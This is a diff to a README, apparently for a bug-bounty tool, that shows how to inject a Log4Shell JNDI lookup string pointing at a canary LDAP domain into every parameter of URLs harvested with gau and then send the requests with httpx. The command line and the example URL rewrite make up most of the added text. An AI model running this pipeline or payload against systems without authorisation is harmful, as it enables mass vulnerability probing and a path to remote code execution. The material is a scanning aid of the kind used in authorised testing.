@@ -23,3 +23,9 @@ optional arguments:
 ```
 getallurls -subs $target | python3 payload-iterator.py -o $target-urls.txt --payload '${jndi:ldap://<id>.your.canary.domain/test}' | httpx
 ```
+This will populate all of the parameters in the URLs supplied by `gau` with the payload and iterator. 
+
+E.g. `http://example.com/?param1=blah&param2=blah&param3=blah` -> `http://example.com/?param1=${jndi:ldap://p2.your.canary.domain/test}&param2=${jndi:ldap://p2.your.canary.domain/test}&param3=${jndi:ldap://p3.your.canary.domain/test}`
+
+## To-do / Improvements
+None at the moment, if you have any suggestions or improvements to be made feel free to create an issue or submit a PR. 
